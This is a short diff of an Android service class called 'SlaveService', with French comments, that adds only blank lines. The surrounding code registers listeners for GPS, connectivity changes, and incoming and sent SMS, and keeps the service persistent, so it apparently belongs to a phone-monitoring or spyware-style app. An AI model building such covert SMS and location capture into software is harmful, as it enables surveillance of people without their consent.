@@ -50,10 +50,12 @@ public class SlaveService extends IntentService {
         handler.post(getGPS);
         // Pour enregistrer l'eventListner sur les changements de connexion (car deprecated dans Nougat)
         registerReceiver(new ConnectionListener(), new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
+
         // Pour enregistrer l'eventListner sur les sms reçus
         IntentFilter filtre = new IntentFilter();
         filtre.addAction("android.provider.Telephony.SMS_RECEIVED");
         registerReceiver(new MessageReceiveListener(), filtre);
+
         // Pour enregistrer l'eventListener sur les sms envoyés
         getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, new MessageSendListner(new Handler(), getApplicationContext()));
         return START_STICKY;
